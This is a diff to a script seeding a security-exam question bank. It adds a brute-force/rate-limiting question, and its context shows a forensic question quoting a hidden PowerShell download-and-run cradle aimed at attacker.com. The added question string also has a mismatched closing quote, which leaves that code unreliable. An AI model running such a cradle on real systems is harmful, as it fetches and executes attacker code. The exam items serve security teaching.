@@ -121,11 +121,19 @@ db.tests.insertOne({
       "explanation": "The attacker is using SQL injection to manipulate the authentication query logic and bypass login security.",
       "examTip": "Use parameterized queries and input validation to prevent SQL injection attacks."
     },
-
-
-
-
-    
+    {
+      "id": 10,
+      "question": "An attacker is attempting a brute-force attack against a web application's login form. The attacker is using a list of common usernames and passwords. However, after a few attempts, the attacker's IP address is blocked, and they can no longer access the login form. Which of the following security controls MOST likely prevented the attack?`,
+      "options": [
+        "Cross-site scripting (XSS) protection",
+        "Rate limiting and/or account lockout",
+        "SQL injection prevention",
+        "Content Security Policy (CSP)"
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": "XSS protection prevents script injection. SQL injection prevention protects against database attacks. CSP controls resource loading. *Rate limiting* and *account lockouts* are the most likely defenses. Rate Limiting: This restricts the number of requests (in this case, login attempts) that can be made from a single IP address or user account within a given time period.Account Lockout: This temporarily (or permanently) disables an account after a certain number of failed login attempts.Both of these controls are designed to thwart brute-force attacks by making it impractical for an attacker to try a large number of username/password combinations. The fact that the attacker's IP address was blocked suggests that rate limiting was in place (or potentially an IP-based blocklist triggered by the repeated attempts).",
+      "examTip": "Rate limiting and account lockouts are effective defenses against brute-force attacks."
+    },
     {
       "id": 11,
       "question": "A forensic analyst detects the following PowerShell command being executed on a compromised system:\n\n`powershell.exe -nop -w hidden -c \"IEX((New-Object System.Net.WebClient).DownloadString('hxxp://attacker.com/payload.ps1'))\"`\n\nWhat is the attacker's likely objective?",
